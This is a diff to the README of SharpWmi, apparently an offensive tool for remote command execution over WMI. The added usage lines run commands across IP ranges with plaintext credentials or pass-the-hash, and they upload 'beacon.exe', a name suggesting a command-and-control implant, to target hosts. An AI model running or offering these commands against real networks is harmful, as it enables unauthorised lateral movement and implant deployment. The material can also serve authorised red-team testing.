@@ -1,7 +1,14 @@
 # SharpWmi
 
 ## 魔改
+```bash
 
+                sharpwmi.exe login 192.168.2.3 administrator 123 cmd whoami
+                sharpwmi.exe login 192.168.2.3/24 administrator 123 cmd whoami
+                sharpwmi.exe login 192.168.2.3-23 administrator 123 upload beacon.exe c:\beacon.exe
+                sharpwmi.exe pth 192.168.2.3-192.168.2.77 cmd whoami
+                sharpwmi.exe pth 192.168.2.3/255.255.255.0 upload beacon.exe c:\beacon.exe
+```
 
 ## 介绍：
 
